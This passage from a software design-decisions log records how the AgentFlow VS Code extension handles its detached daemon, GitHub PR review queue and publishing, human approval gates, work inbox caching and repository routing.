The command rebuilt the client and called `ensureConnected()`. The daemon is
detached and its lockfile still named a live pid, so it reattached to the very
process it was meant to replace. Nothing failed, which is why it survived for
this long — the symptom was new code appearing to have no effect after
reinstalling the extension, which reads as a build problem.

`shutdownDaemon()` sends the `shutdown` RPC that the daemon has answered since
M0 and that no client ever called, then waits for the lock to clear. Two
details are the point rather than the plumbing:

- It **returns false** instead of throwing when the lock does not clear, and the
  caller then refuses to reconnect. Reconnecting on failure is the original bug,
  and a silent reattach is worse than a visible refusal.
- It **asks first** when runs are in flight, naming them. `dispose()` leaving
  the daemon alive is deliberate — a window reload must not kill a run — so a
  command that genuinely stops it has to be the one that says so.

## Decisions made adding the GitHub PR queue

### D58 — `fetch`, not octokit

§7.7's read surface is six plain REST calls, and Node has had `fetch` since 18.
A dependency would have to be vendored beside the bundle the way the Agent SDK
is (D42), because the packaged `.vsix` ships no `node_modules` — so octokit
would cost megabytes and a second vendoring path to save a few lines.

The module is **read-only on purpose**. §7.5 is emphatic that findings are
never auto-posted, and a module with no write method cannot be made to post by
accident later.

### D59 — Tagged and untagged are different queries, not one list filtered twice

`labels` is a discriminated union — `any`, `tagged`, `untagged` — rather than
an optional array. An empty array would be ambiguous between "no filter" and
"no labels", and the untagged case is the one people actually want: it is the
untriaged pile, and a list of everything never surfaces it.

Both are resolved **server-side** through the search API. A busy repo's open
PRs run to hundreds, and paginating all of them to filter locally is the
difference between a queue that opens instantly and one nobody waits for.

### D60 — Three token sources, explicit ones first

`SecretStorage` (what the §7.7 PAT lives in), then `$AGENTFLOW_GITHUB_TOKEN`
and the conventional `$GITHUB_TOKEN`/`$GH_TOKEN`, then `gh auth token`. The
`gh` fallback is last because it is the least explicit, and present at all
because a developer already signed in should not have to mint a second token.

Absence returns undefined rather than throwing: a workspace that only runs the
deliver pipeline has no GitHub configuration and that is not an error. The
required scope is named in the code that requires it, because "what does it
ask for" is the first question a security review asks.

Failures are **returned, not thrown**, across the RPC boundary. An unreachable
GitHub is a state the list can render with the fix in it; an RPC error would
surface as a toast with a stack trace. 404 in particular says what it usually
means on a private repo — a token that cannot see it — rather than sending
someone to hunt a missing PR.

*Not yet done:* running a review against a PR. The queue is real; §7's pipeline
— fetching `pull/N/head` into a worktree, claim conformance, the local gate run
on the merge-base delta — is not. The command says so rather than starting
something that quietly does nothing.

## Decisions made moving the UI into an editor tab

### D61 — The dashboard is an editor tab; the trees stay as a launcher

§12.1 lists both a Runs TreeView and a Dashboard webview, and the split is
about width rather than preference. A swimlane per run with its seven phases
lit needs room; a 300px sidebar column turns the pipeline into a scrollbar and
the summary into an ellipsis. So the dashboard — runs, the decisions waiting on
you, and the live activity line — opens in an editor tab, on connect by default
(`agentflow.ui.openDashboardOnStart`).

The trees are **kept**, not replaced. They carry the "needs you" badge, they
are where the welcome view and the title-bar button live, and removing a
working surface to make a point about a new one costs someone their habit.

Run detail moved to `ViewColumn.Beside` for the same reason: opening a timeline
on top of the dashboard replaces the thing you were watching.

### D62 — Plain HTML, not §12.4's React + Vite, for now

The run detail panel already established the pattern — a nonce CSP, `--vscode-*`
variables throughout, message passing — and a second page does not justify
introducing the repo's only bundler-for-a-view. §12.4's real requirements are
theming (done), state persistence across a hidden panel (`setState`, done) and
**virtualizing the timeline**, which is the one this cannot do: tens of
thousands of events in a plain list will jank. That is the trigger to revisit,
not the framework.

### D63 — What the browser caught that reading would not have

The page was rendered outside VS Code with a stubbed `acquireVsCodeApi` and a
fallback palette, and three things only showed up on screen:

- `'\\u2192'` inside a template literal reaches the page as the *text*
  `\u2192`. Literal `→` has no such failure mode.
- A backtick inside a CSS comment terminates the template literal. TypeScript
  caught that one, but only because it was looked at again.
- Two columns at 620px squeezed the runs to nothing: the right column's
  `minmax(300px, …)` minimum wins and the phase pills clip. An editor tab is
  routinely split or narrow, so below 860px they stack — with
  `align-content: start`, without which the grid stretches its rows and leaves
  a dead gap between the activity list and the decisions.

### D64 — The sidebar opening is the signal to reveal the dashboard

An activity-bar icon can only open its own view container; VS Code offers no
way to bind one to an editor tab. So the container becoming visible is taken as
the intent — clicking the AgentFlow icon means "show me AgentFlow", and the
board belongs in the editor area where it has room (D61).

`onlyIfHidden` and `preserveFocus` are both load-bearing. Without the first,
every return to the sidebar re-reveals a panel already in front and changes the
active tab under the human; without the second, clicking the sidebar throws
focus into the editor, which is the opposite of what a sidebar click asks for.

`agentflow.ui.openDashboardOnClick` turns it off, because an editor tab that
appears when you touch the sidebar is exactly the kind of helpfulness that
becomes irritating on the fiftieth time.

## Decisions made building the Work Inbox

### D65 — Cache first, and never an empty list for a source that failed

§6.4's three properties are each a way this kind of thing normally goes wrong,
and the poller implements all three:

- **The list renders from disk before anything is fetched.** An inbox that is
  blank for two seconds every morning is one you stop trusting before you stop
  opening. Only the explicit Refresh waits on the network.
- **A source that fails keeps its last good items** and gains a `problem`.
  "You have no work" and "I could not ask" are different answers, and only one
  of them means you can stop looking — so the UI shows the stale list, when it
  was fetched, and what went wrong.
- **Per-source intervals with jitter** — 300 s for tickets, 120 s for reviews,
  because tickets move more slowly than a review queue — so two sources do not
  stampede together on every tick. The timers are `unref`'d: a poll must never
  be the reason the daemon stays alive.

### D66 — The host is the team's; the credentials are yours

`.agentflow/config.json` can supply `integrations.jira.host`, because it is the
same for everyone on the team and belongs in the repo. Credentials are read
only from `SecretStorage` or the environment, never from a repo file, and the
resolver needs all three before it reports a configuration at all — a partial
one produces a 401 that looks like a wrong password.

The extension holds the secrets and passes them with the request; the daemon
keeps them in memory for as long as it is up and never writes them. A malformed
`config.json` returns undefined rather than throwing, because a typo in a
config file should not take the inbox down.

### D67 — What the browser caught in the work list

Two things, both only visible on screen:

- The row actions were revealed on hover. An action you cannot see is an action
  nobody uses, so they are always visible now, and only their emphasis changes
  on hover.
- In the dashboard's narrow right column, the action was pushed **off the right
  edge** entirely — present in the DOM, unreachable. The row wraps now, and a
  check that every action's bounding box lies inside the viewport is what
  confirmed it rather than a glance.

## Decisions made wiring the PR review pipeline

### D68 — Autonomy is pipeline-aware; a review pipeline requires only G3

The blocker that held §7 for three sessions. `AUTONOMY_GATES` demanded G1, G2
and G3 of every workflow under the default `gated` policy, so W6 rejected a
`pr-review` profile outright — and the profile could not honestly declare
those gates, because **G1 approves a specification and G2 approves a plan, and
a PR review produces neither**. There is no artifact for them to be about.
Demanding them would not have made anything safer; it made the profile
unexpressible.

`requiredHumanGates(autonomy, kind)` filters to G3 for a review pipeline. G3
stays mandatory at every autonomy level, which preserves what D1 was actually
protecting: no pipeline ends without a human deciding. A review workflow that
drops G3 is still rejected.

### D69 — The machine honours the workflow's gate set

Related and necessary: `advance` consulted `GATE_AFTER_STEP` alone, so it
would have parked a review run at G1 regardless of what the workflow declared.
All three gates were hardcoded into the state machine, and W6 was the only
thing stopping a workflow from disagreeing with it.

`PipelineOptions.gates` now carries the declared set and `advance` checks
membership. The policy decides what a workflow *may* declare; the workflow
decides what the run *does*. Those were the same thing only because nothing
had ever needed them to differ.

### D70 — The diff is against the merge base, and nothing is posted

Two things §7 is specific about, both enforced here rather than trusted:

- The worktree is created from `refs/pull/N/head` — a PR branch often lives on
  a fork the remote cannot see, and the pull ref is the only handle that always
  exists — and **detached**, so the review cannot commit. The diff is taken
  against `merge-base(base, head)`, not the base tip: a target branch that
  moved on since the PR opened would otherwise show every unrelated commit as
  part of the change.
- Blocking findings do **not** route back to build. A review pipeline has no
  build — the change is someone else's — so everything goes to the human at
  G3, and the run says in as many words that nothing was posted to GitHub.

The gate ladder really runs on the PR head, which is §7.3's differentiator: a
finding that says a test fails carries a stack trace. What is *not* done is
§7.3's second half — running the ladder on the merge base too and reporting
only the delta — so a red gate is reported as "may or may not predate the PR"
rather than excused. Claiming it was pre-existing without checking would be
the false negative equivalent of the false green.

### D71 — The daemon's build identity, because the protocol version was never bumped

"Stuck fetching PRs" was a daemon started two and a half hours before the
`.vsix` that added `github/pulls`. It answered the handshake, so nothing looked
broken, and every method the new extension had added went to a process that had
never heard of it.

`PROTOCOL_VERSION` exists precisely to catch this and did not: it is a
hand-maintained constant, it was still `1` on both sides, and nobody had bumped
it across five added methods. **A version nobody remembers to bump is not a
version check.**

The lockfile now records `entryMtimeMs` — the mtime of the bundle the daemon
was started from — and the client compares it against the bundle it would spawn
before attaching. Different build, restart it. This cannot be forgotten,
because it is derived rather than declared, and it makes installing a new
`.vsix` self-healing instead of requiring `pkill`.

Two things that turned a failure into a hang, fixed alongside:

- **Neither HTTP client had a timeout.** `fetch` waits forever by default, and
  a request that never returns is worse than one that fails: the spinner spins,
  nothing is logged, and there is nothing to act on. Both now abort at 15 s and
  say so.
- **The review command had no `catch`.** A rejection was swallowed by the
  command handler, so the only evidence was a progress notification that
  stopped moving.

### D72 — Wait for the driver to go quiet, do not guess at it

The driver tests tore down their workspace after `cancelAll()` and a 60 ms
sleep. `cancel` only sets a flag that steps check at their *boundaries*, so a
step already awaiting a git call or a gate run finishes afterwards and writes
its result — into a directory that is no longer there. The result was an
unhandled ENOENT reported beside 427 passing tests.

It held on one machine and not another, which is the worst kind of green: the
suite says pass, the error says something is wrong, and nothing connects the
two to a test you can run.

`RealRunDriver.settle()` awaits the in-flight chain until it is empty —
draining in a loop rather than awaiting one snapshot, because a step enqueues
its successor while the first is still resolving. Six consecutive runs of the
two driver suites and three of the full suite, all clean.

## Decisions made making the daemon survive a reload

### D73 — Logging must never be able to throw

VS Code disposes output channels during extension-host teardown in
registration order, which can bury ours before `OrchestratorClient.dispose()`
runs. A socket error arriving in that window called `this.log()` into a dead
channel, and the host logged "Channel has been closed" against AgentFlow's
name — an error that reads as the extension breaking when it is only the
extension trying to mention that it isn't.

Every internal log now goes through a wrapper that no-ops once disposed and
swallows a dead channel. Nothing was registered on `connection.onError`
either, so a vscode-jsonrpc write that lost its socket mid-flight escaped as
an unhandled `EPIPE`; reload guarantees that write. Teardown also drops our
own socket listeners before destroying the socket and leaves a no-op behind,
because an `'error'` with no listener is a throw in Node, not a warning.

Cosmetic in effect, but the cost was diagnostic: our noise sat in the same log
as everyone else's real failures.

### D74 — A detached daemon cannot log to its parent's pipe

The daemon is detached so that reloading a window cannot kill a run. That
guarantee was false, and had been since the daemon existed.

It logged to `process.stderr` — a pipe held by the extension host that spawned
it. Every reload exits that host and closes the read end, so the next log line
raised `EPIPE` with no handler, which in Node is fatal. The next line is
`client attached`, which means the *new* window's own connection was what
finished the daemon off. Whatever run was in flight went with it.

The daemon now writes to `.agentflow/orchestrator.log`, rotated one generation
past 2MB. `process.stdout` and `process.stderr` also get error handlers, so a
broken pipe from anywhere else stays non-fatal — either change alone would
have fixed this, and the second is cheap insurance against the next caller who
reaches for stderr.

The log file closes a gap found while diagnosing this: when a daemon died
there was no record anywhere of why, in the extension host log or on disk.

`daemonSurvival.test.ts` spawns the real entry point, because the bug lived
entirely in how the process was wired to its parent and no in-process test
could have seen it. Verified by reverting the fix: both survival tests fail
there, and fail *fast* — the handshake carries its own 5s clock, because a
dead daemon leaves the request pending forever and the first version of the
test hung the suite instead of failing it.

## Decisions made publishing findings to GitHub

### D75 — The write surface is its own module, and cannot express an approval

§7.5's two rules are the whole design here, and both are enforced rather than
documented.

**Never `APPROVE`.** `ReviewEvent` has two members — `COMMENT` and
`REQUEST_CHANGES`. An approval is not a value this code can construct, so the
rule holds even where a caller is careless. `publish` also checks the value at
runtime, which is redundant by design: this is the one place in the system
where being wrong forges someone's signature on someone else's code, and
redundancy is cheap against that.

**A separate module.** `github.ts` is read-only by construction (D51) and
stays that way; `publishReview.ts` is the only file that POSTs. This keeps
"what can write?" answerable by listing one file, and it is why the write path
does not reuse `github.ts`'s request helper. The error messages genuinely
differ anyway — a 403 on a write means the token *can* read the repository it
just failed to write to, and reusing the read path's "missing the repository
scope" would send someone to check the wrong permission.

Nothing inside the pipeline calls `publish`. It takes already-triaged findings
and there is no threshold, no setting and no caller that reaches it without a
person, which is §7.5's second rule.

### D76 — Deduplication is a window, and the sha record lives on GitHub

Two decisions where the conservative direction is not the obvious one.

**A window, not an exact line.** A person commenting on line 42 and the
reviewer flagging line 44 of the same hunk are discussing the same code.
`DEDUPE_WINDOW` is 3, and suppressing a little too eagerly is the right error
to make: a dropped finding is still sitting in the triage view where its
author can see it, while a duplicate is visible to everyone on the PR and is
exactly what gets a bot muted. Bot comments never suppress, or our own
previous review would silence the next one.

**The sha marker.** "Never re-review a head sha already reviewed" has to
survive a window reload, a reinstall and a second machine, so it cannot be
local state. The review body carries `<!-- agentflow:review sha=... -->` and
GitHub is the record. A force-push changes the sha, which invalidates it for
free rather than by cache logic. The marker is matched in full, so a human
review that merely mentions the sha in prose does not read as ours.

### D77 — A rejected anchor degrades the review instead of losing it

GitHub rejects the *entire* review with a 422 if any single comment is
anchored to a line outside the diff. One bad line number would therefore throw
away every other finding a person had just spent their attention triaging.

Two layers. `select()` routes findings with no line, or a line the caller says
is not in the diff, into the summary body before anything is sent. And if a
422 still comes back, `publish` retries once with every comment folded into
the body and reports `degraded: true`, so the caller can say what happened.
Body-only is worse than inline and much better than silence.

## Decisions made routing a ticket to a repository

### D78 — One repo per run, but no longer necessarily the workspace

§1376 asked whether `Run` is one-repo-*by-definition* or one-repo-*in-v1*, and
warned that retrofitting the second is expensive. This answers it: one repo
per run, chosen rather than assumed.

`RepoRef.id` and `Task.repo` had existed since M0 and **nothing read either**.
`repo.path` was `paths.root` unconditionally, so a ticket whose changes lived
in another repository could only be worked by closing the workspace and
opening that one.

The constraint that looked necessary — restrict the registry to paths inside
the workspace — turns out to be useless. Sibling clones are the normal layout
for related services, and a monorepo subdirectory is not a separate git
repository at all, so an "inside only" registry would route nothing anybody
has. `WorktreeManager` already took a repo root as a parameter and was simply
always handed `paths.root`; rebinding those five call sites to
`run.repo.path` is the whole mechanism.

What stays in the workspace is the run's *state*: `.agentflow/runs`, the lock,
the log and the IPC socket. Only git moves. A run's worktree is now a sibling
of the repo it came from rather than of the workspace, because §20.2's rule is
about the repo.

Known gap: two workspaces whose registries both name repo X can each create
worktrees in X. Worktrees are per-ticket so a collision needs the same ticket
run twice, and `createWorktree` already refuses to clobber an existing path.
Routing runs to the daemon that owns a repo is the honest fix and is deferred
with the rest of cross-repo v2.

### D79 — Routing degrades to the old behaviour, loudly

Every failure path in `loadRepoRegistry` ends at the workspace repo: no
config, unparseable config, no `repos` key, an id that matches nothing. A typo
in a committed config file must not stop every run in the workspace, and
"runs target the repo they always did" is a comprehensible failure in a way
that "no run can start" is not.

The workspace is kept as `fallback` even when the registry never mentions it,
or a ticket matching no rule would have nowhere to go.

A missing checkout or a path that is not a git repository is **reported, not
rejected** — a teammate's clone may legitimately be absent on this machine,
and that must not disable the repos that are present.

Project key beats label: a key is structural, a label is something anyone can
add to a ticket. An explicit `repoId` beats both, because a human naming a
repository is not a heuristic.

Every run logs which repo it chose and why, and says so when more than one
entry claimed the ticket. Branching the wrong repository and not discovering
it until ship is the failure this line exists to prevent.
